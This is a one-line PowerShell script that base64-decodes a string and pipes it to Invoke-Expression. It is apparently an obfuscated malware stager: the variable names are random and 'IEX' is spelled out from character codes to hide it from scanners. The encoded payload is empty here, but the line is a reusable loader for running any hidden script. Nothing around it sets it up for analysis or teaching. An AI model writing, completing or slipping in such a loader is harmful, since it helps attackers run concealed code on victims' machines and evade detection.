$QJQNRJQ="";$RAIKFQMB=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($QJQNRJQ));$RAIKFQMB|&([char]73+[char]69+[char]120)